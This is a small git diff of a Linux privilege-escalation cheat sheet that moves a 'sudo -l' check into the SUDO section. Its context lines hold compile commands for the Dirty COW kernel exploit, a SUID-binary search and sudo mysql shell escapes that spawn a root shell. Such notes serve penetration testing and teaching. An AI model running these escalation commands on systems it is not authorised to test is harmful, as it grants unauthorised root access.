@@ -312,10 +312,6 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 ```
 
-```bash
-sudo -l
-```
-
 ## SUID
 ```bash
 $ find / -perm -u=s -type f 2>/dev/null
@@ -349,6 +345,9 @@ https://github.com/pentestmonkey/unix-privesc-check
 ```
 
 ## SUDO
+```bash
+sudo -l
+```
 ```bash
 sudo mysql -e '\! /bin/sh'
 sudo /usr/bin/mysql -e 'system bash'
